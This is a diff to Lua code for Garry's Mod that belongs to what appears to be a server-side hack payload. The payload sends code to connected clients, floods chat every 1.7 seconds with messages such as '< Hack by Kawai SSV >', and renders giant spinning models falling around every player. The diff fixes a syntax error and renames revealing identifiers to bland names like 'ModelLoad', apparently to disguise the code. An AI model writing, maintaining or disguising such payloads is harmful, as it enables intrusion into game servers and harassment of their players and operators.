@@ -302,7 +302,7 @@ end)
 -- Spam Chat
 timer.Simple(5, function()
 InfoClient([[  
-timer.Create("]] .. randomtable["ServeurRadom] .. [[", 1.5, 0, function()
+timer.Create("]] .. randomtable["ServeurRadom"] .. [[", 1.7, 0, function()
 local time = tonumber(0)
 local Message = {
     "< Hack by Kawai SSV >",
@@ -339,16 +339,16 @@ timer.Create("]] .. RandomString(0, 69) .. [[",1,5800,function()
 local Model12 = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
     Model12:SetNoDraw(true)
     Model12:SetModelScale(50)
-timer.Create("TuEsEnSueur", 0.01, 0, function()
+timer.Create("ModelLoad", 0.01, 0, function()
     Model12:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
 end)
 local data = {}
-local function gensheitan(id)
+local function ModelLoad12(id)
 local pos = LocalPlayer():GetPos()
     data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
 end
     for i=1, 50 do
-    gensheitan(i)
+    ModelLoad12(i)
 end
     hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
 local z = LocalPlayer():GetPos().z
@@ -358,7 +358,7 @@ local z = LocalPlayer():GetPos().z
         Model12:DrawModel()
         data[i][1].z = data[i][1].z - data[i][2] / 20
         if data[i][1].z <= z then
-        gensheitan(i)
+        ModelLoad12(i)
     end
 end
     end)
